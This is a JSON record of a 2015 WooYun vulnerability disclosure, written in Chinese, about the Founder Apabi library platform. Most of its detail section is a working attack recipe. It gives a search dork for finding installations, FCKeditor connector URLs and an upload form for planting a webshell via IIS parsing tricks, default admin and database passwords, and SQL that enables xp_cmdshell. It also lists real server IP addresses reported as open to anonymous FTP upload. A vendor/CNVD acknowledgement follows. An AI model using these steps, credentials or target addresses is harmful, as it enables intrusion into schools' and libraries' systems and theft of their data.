{"id": 28768, "wybug_id": "wooyun-2015-0121361", "wybug_title": "方正阿帕比数字资源平台系统多处漏洞打包-可拖库-可getshell-可获取系统权限（通用 多案例）", "wybug_corp": "北京方正阿帕比技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-18 14:50", "wybug_open_date": "2015-09-21 09:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "解析漏洞", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向公众公开  简要描述： 乌云是目前最大的漏洞平台，只要你知道的系统、网站，它们的漏洞都可以从乌云上找到，所以乌云的漏洞库是一笔无形的巨大财富~ 详细说明：  Apabi数字资源平台系统是一个用户量很大的图书馆系统涉及网站太多为图书馆、学校等教育机构，甚至地方人社局等，而绝大部分服务器都不是单一的运行着这一套系统...真是个好“邻居”...\ngoogle 关键字构造数字资源平台-用户登录inurl:Usp/?cult=CNinurl:Usp/apabi_usp/\n\n\n\n\n在 /comm/admin/存在FCKEDITOR编辑器 version 2.6.6 Build 25427 \nComm/admin/fckeditor/editor/dialog/fck_about.html\n\n\n...\n\nFCKEDITOR上传漏洞.综合IIS6解析漏洞 轻松获取webshell查看版本\n/comm/admin/fckeditor/editor/dialog/fck_about.html\n访问后建立shell.asp文件夹（iis6解析漏洞）\n/comm/admin/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684\n\n/comm/admin/FCKeditor/editor/filemanager/connectors/test.html#\n\n<form id=\"frmUpload\" action=\"http://site.com/comm/admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=/\" method=\"post\" enctype=\"multipart/form-data\">File Upload<br /><input id=\"txtFileUpload\" type=\"file\" name=\"NewFile\" /><input type=\"submit\" value=\"Upload\"  /></form>\nFCKEDITOR+IIS7.5解析漏洞文件名\na.asp.a;.a.asp.jpg..jpg\n②：后台 /usp/admin/   默认系统管理用户密码 \nadmin  foundersuperadmin  founder\n后台还支持查看用户信息及可导出\n\n③： 默认安装mssql2005数据库 默认运行于系统账户 DBA账户密码\nData Source=(local);Initial Catalog=Usp_1;User ID=ApaUspUser;password=USPbsq93\"/>\n如果服务器对外开放1433端口，基本就沦陷了，或者利用上面fckeditor 漏洞拿下webshell 同样效果\nExec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\n\nExec master.dbo.xp_cmdshell 'whoami'\n\n\n④系统默认是需要开启FTP的，可匿名访问..可上传下载、如果是处于外网...直接可以上传shell\n默认下载目录是  /ApaDownLoadDlib  或者/ApaDownLoadDlib1,2,3,4\n 既然说是通用，这里给出几个案例\nftp://222.192.176.202/ApaDownLoadDlib/wooyun.txtftp://221.224.25.30/wooyun.txtftp://202.199.163.22//ApaDownLoadDlib/wooyun.txtftp://211.153.20.131//ApaDownLoadDlib/wooyun.txtftp://162.105.138.136/ApaDownLoadDlib/wooyun.txt\n   漏洞证明：  漏洞证明在上面详细说明里已足够、拿下webshell后在99.9%均可获取到系统权限，进入远程桌面任意操作。这里就不证明了，并无深入！\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  打怪升级..   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-06-23 09:12 厂商回复： CNVD确认并复现所述情况,目前暂未建立直接处置渠道,由于涉及用户案例较多,CNVD正尝试通过公开联系渠道通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}